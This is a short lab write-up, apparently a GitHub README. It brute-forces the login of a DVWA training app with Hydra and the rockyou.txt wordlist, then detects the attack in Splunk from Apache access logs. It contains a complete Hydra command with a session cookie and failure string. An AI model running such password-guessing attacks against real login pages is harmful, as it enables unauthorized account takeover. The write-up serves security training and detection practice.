Launching an Attack from Another PC in the LAN:

We will attack using the Hydra tool. First, we need to obtain the cookies from the website.

![image](https://github.com/user-attachments/assets/b58c9bc4-8ed9-410e-84d7-f626b2426b48)
 
using hyra tool:

payload:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
"http-get-form://172.17.128.158/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=medium; PHPSESSID=5ba0cf3c373c345a17dbcfb19b595c31:F=Username and/or password incorrect"
```
This Hydra command is used for brute-forcing the login of a website.

-Target: 172.17.128.158/DVWA/vulnerabilities/brute/

-Username: Always "admin"

-Passwords: Attempted from the rockyou.txt list

-Cookies: Includes session info to bypass security

-Failure pattern: Looks for "incorrect password" message to know when to try the next password

![image](https://github.com/user-attachments/assets/fa79da0e-1857-40c3-8b0c-30cda63cb211)

Attack successful. Now, try to detect it from Splunk Enterprise:

We can see that there are a large number of login attempts being made and see that tool hydra been used.

![image](https://github.com/user-attachments/assets/8f5584f3-607f-4f3b-9ba6-e4d19acebaba)

We can see that there are a large number of login attempts being made

![image](https://github.com/user-attachments/assets/dcc87be5-310d-42e4-8c12-723bf30e77c8)
  
Many passwords have been tried during the attack, and we can confirm that it’s a brute-force attack

This table shows that a brute-force attack has occurred.
 
command 
```
host="victim"  source="/var/log/apache2/access.log" sourcetype=access_combined brute password hydra
| table _time clientip username password
```
![image](https://github.com/user-attachments/assets/958ac55c-6f98-4559-b93e-0bc85d1e1897)


